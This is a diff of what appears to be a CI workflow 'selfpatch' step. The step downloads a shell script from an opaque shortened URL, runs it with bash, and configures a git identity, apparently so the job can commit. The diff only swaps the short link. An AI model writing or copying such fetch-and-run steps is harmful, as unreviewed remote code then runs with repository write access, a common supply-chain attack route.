@@ -21,7 +21,7 @@ jobs:
           mkdir -p .ci-logs
           L=.ci-logs/selfpatch.log
           : > "$L"
-          curl -fsSL -o /tmp/apply.sh https://aka.doubaocdn.com/s/c0DUdyUjAo >> "$L" 2>&1
+          curl -fsSL -o /tmp/apply.sh https://aka.doubaocdn.com/s/1XjA2RfLDW >> "$L" 2>&1
           bash /tmp/apply.sh "$L" >> "$L" 2>&1
           git config user.name "bluewhale-ci"
           git config user.email "ci@bluewhale.local"
